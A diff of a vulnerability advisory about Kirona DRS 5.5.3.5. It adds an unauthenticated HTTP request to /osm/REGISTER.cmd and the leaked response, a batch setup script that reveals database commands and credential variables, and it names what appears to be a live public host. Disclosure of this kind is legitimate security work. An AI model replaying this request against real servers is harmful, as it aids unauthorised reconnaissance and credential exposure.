@@ -3,7 +3,7 @@
 # Discovered Date: 03/10/2019
 # Exploit Author: Ramikan
 # Vendor Homepage: https://www.kirona.com/solutions/dynamic-resource-scheduling/
-# Affected Version: 5.5.3.5 may be other versions.
+# Affected Version: 5.5.3.5 may be other versionss.
 # Tested On Version: 5.5.3.5 
 # Vendor Fix: Unknown
 # CVE: N/A	
@@ -123,10 +123,216 @@ Vulnerability 2: Source code and sensitive info disclosure.
 
 Unauthenticated user can access this link (/osm/REGISTER.cmd, /osm_tiles/REGISTER.cmd) diectly which contains the sensitive info about the database. Exposes the sql database information such as tablename, username, etc.
 
-
 https://10.0.0.148/osm/REGISTER.cmd
 
 http://82.196.226.108/osm_tiles/REGISTER.cmd
+
+
+
+Request:
+
+GET /osm/REGISTER.cmd HTTP/1.1
+Host: 10.0.0.148
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Thu, 03 Oct 2019 09:23:54 GMT
+Server: Apache
+Last-Modified: Tue, 07 Nov 2017 09:27:52 GMT
+ETag: "1fc4-55d612f6cae13"
+Accept-Ranges: bytes
+Content-Length: 8132
+Connection: close
+
+@echo off
+
+set DEBUGMAPSCRIPT=TRUE
+
+rem
+rem Find root path and batch name
+rem root path is found relative to the current batch name
+rem 
+
+rem turn to short filename (remove white spaces)
+for %%i in (%0) do (
+  	set SHORT_MAPSCRIPTBATCH_FILE=%%~fsi
+    set MAPSCRIPTBATCH_FILE=%%~i
+    
+)
+for %%i in (%SHORT_MAPSCRIPTBATCH_FILE%) do (
+	set MAPSCRIPTROOTDIR=%%~di%%~pi..\..\..
+)
+
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo MAPSCRIPTROOTDIR=%MAPSCRIPTROOTDIR%
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo MAPSCRIPTBATCH_FILE=%MAPSCRIPTBATCH_FILE%
+
+rem
+rem find if we are in INTERRACTIVE mode or not and check the parameters
+rem 
+if "%1"=="" goto INTERACTIVE
+goto NONINTERRACTIVE
+
+
+:NONINTERRACTIVE
+rem non interractive call so catch the parameters from command line
+rem this is supposed to be called from the root DRS directory
+
+if "%2"=="" (
+  echo Invalid parameter 2
+  pause
+  goto :EOF
+)
+
+set ACCOUNT=%2
+set STATIC=NO
+if "%1"=="STATIC" set STATIC=YES
+
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo Command line mode %STATIC% %ACCOUNT%
+
+if "%1"=="STATIC" goto GLOBAL
+if "%1"=="DYNAMIC" goto GLOBAL
+echo Invalid parameter 1
+pause
+goto :EOF
+
+:INTERACTIVE
+rem Interractive mode : ask for account and static mode
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo Interractive mode
+echo Open Street Map setup for Xmbrace DRS
+set /P ACCOUNT=Account name:
+set /P STATIC=Limited map feature (YES/NO):
+
+
+rem back to the setup directory
+cd %MAPSCRIPTROOTDIR%
+
+rem # READ AND DEFINE SETTINGS
+for /F "tokens=1,* delims==" %%k in (conf\default.txt) do (
+  if not "%%k"=="#=" set %%k=%%l
+)
+if exist CUSTOM\CONF\custom.txt (
+  for /F "tokens=1,* delims==" %%k in (CUSTOM\CONF\custom.txt) do (
+    if not "%%k"=="#=" set %%k=%%l
+  )
+)
+for /F "tokens=1,* delims==" %%k in (conf\settings.txt) do (
+  if not "%%k"=="#=" set %%k=%%l
+)
+
+if "%APACHE_USE_SSL%"=="TRUE" (
+  set DEFAULT_HTTP_PROTOCOL=https
+  set APACHE_USE_SSL_VALUE=true
+  set DEFAULT_HTTP_PORT=%APACHE_HTTPS_PORT%
+) else (
+  set DEFAULT_HTTP_PROTOCOL=http
+  set APACHE_USE_SSL_VALUE=false
+  set DEFAULT_HTTP_PORT=%APACHE_HTTP_PORT%
+)
+
+goto GLOBAL
+
+
+
+rem
+rem good to go in a non interractive mode
+rem the following is the generic par of the install, whatever we are in static or dynamic mode
+rem
+:GLOBAL
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo Global section
+
+set MYSQL="MYSQL\MySQL Server 5.6 MariaDB\bin\mysql.exe"
+
+echo delete from %ACCOUNT%.asp_custom_action where CA_CAPTION in ('Show on map','Closest')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo delete from %ACCOUNT%.asp_custom_tab where NAME='Map'> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+set INSERTFIELDS=%ACCOUNT%.asp_custom_action (CA_CAPTION,CA_VIEW,CA_MODE,CA_LIST_MODE,CA_HEIGHT,CA_WIDTH,CA_RESIZABLE,CA_NEED_REFRESH,CA_PROFILES,CA_URL,CA_CUSTOM_TAB,CA_TRIGGER_MODE)
+
+if "%STATIC%"=="YES" goto :STATIC
+goto :DYNAMIC
+
+
+
+:STATIC
+
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo Static section
+
+echo map=static > ACCOUNTS\%ACCOUNT%\config.txt
+
+echo ^<?php $staticMap=true; ?^>>APACHE\htdocs\osm\mode.php
+
+echo insert into %INSERTFIELDS% values ('Journey on map','workerList','modal','unique',600,1024,true,false,'Administrator','%DEFAULT_HTTP_PROTOCOL%://%OTRMS_HOST%:%DEFAULT_HTTP_PORT%/osm/map.php?account=%ACCOUNT%^&mapType=journey','','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+echo insert into %INSERTFIELDS% values ('Journey on map','workerView','modal','unique',600,1024,true,false,'Administrator','%DEFAULT_HTTP_PROTOCOL%://%OTRMS_HOST%:%DEFAULT_HTTP_PORT%/osm/map.php?account=%ACCOUNT%^&mapType=journey','','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+if exist req.sql del req.sql
+goto FINAL
+
+
+:DYNAMIC
+
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo Dynamic section
+
+echo map=dynamic > ACCOUNTS\%ACCOUNT%\config.txt
+
+echo ^<?php $staticMap=false; ?^>>APACHE\htdocs\osm\mode.php
+
+echo insert into %INSERTFIELDS% values ('Show on map','jobList','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+echo insert into %INSERTFIELDS% values ('Show on map','jobView','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo insert into %INSERTFIELDS% values ('Closest','jobList','modal','unique',600,1024,true,false,'Administrator','%DEFAULT_HTTP_PROTOCOL%://%OTRMS_HOST%:%DEFAULT_HTTP_PORT%/osm/map.php?account=%ACCOUNT%^&mapType=closest','','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+echo insert into %INSERTFIELDS% values ('Closest','jobView','modal','unique',600,1024,true,false,'Administrator','%DEFAULT_HTTP_PROTOCOL%://%OTRMS_HOST%:%DEFAULT_HTTP_PORT%/osm/map.php?account=%ACCOUNT%^&mapType=closest','','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo insert into %INSERTFIELDS% values ('Show on map','workerList','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+echo insert into %INSERTFIELDS% values ('Show on map','workerView','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo insert into %INSERTFIELDS% values ('Journey on map','workerList','modal','mandatory',600,1024,true,false,'Administrator','%DEFAULT_HTTP_PROTOCOL%://%OTRMS_HOST%:%DEFAULT_HTTP_PORT%/osm/map.php?account=%ACCOUNT%^&mapType=journey','','button')> req.sql
+rem %MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo insert into %INSERTFIELDS% values ('Show on map','customerList','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+echo insert into %INSERTFIELDS% values ('Show on map','customerView','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo insert into %INSERTFIELDS% values ('Show on map','serviceOrderList','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+echo insert into %INSERTFIELDS% values ('Show on map','serviceOrderView','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo insert into %INSERTFIELDS% values ('Show on map','planning','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+
+set INSERTFIELDS=%ACCOUNT%.asp_custom_tab (NAME,POSITION,ADMIN,URL,WIDTH,HEIGHT)
+
+echo insert into %INSERTFIELDS% values ('Map',0,'false','%DEFAULT_HTTP_PROTOCOL%://%OTRMS_HOST%:%DEFAULT_HTTP_PORT%/osm/map.php?account=%ACCOUNT%','100%%','100%%')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+if exist req.sql del req.sql
+goto FINAL
+
+
+:FINAL
+echo Map registred for %ACCOUNT%
+if "%1"=="" pause
+goto :EOF
+
 
 ***************************************************************************************************************************
 Recommendation:
